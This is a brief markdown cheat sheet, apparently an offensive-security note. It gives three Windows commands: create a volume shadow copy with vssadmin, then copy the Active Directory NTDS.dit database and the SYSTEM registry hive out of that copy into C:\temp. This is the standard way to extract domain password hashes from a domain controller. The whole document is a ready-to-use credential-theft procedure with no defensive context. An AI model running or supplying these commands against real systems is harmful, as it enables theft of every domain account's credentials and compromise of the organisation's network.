### create shadow copy of ntds.dit
```
vssadmin create shadow /for=C:
```

### copy shadow copy
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<id>\Windows\NTDS\NTDS.dit C:\temp\<ntds>.dit
```

### copy system hive
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<id>\Windows\System32\config\SYSTEM C:\temp\system.hive
```
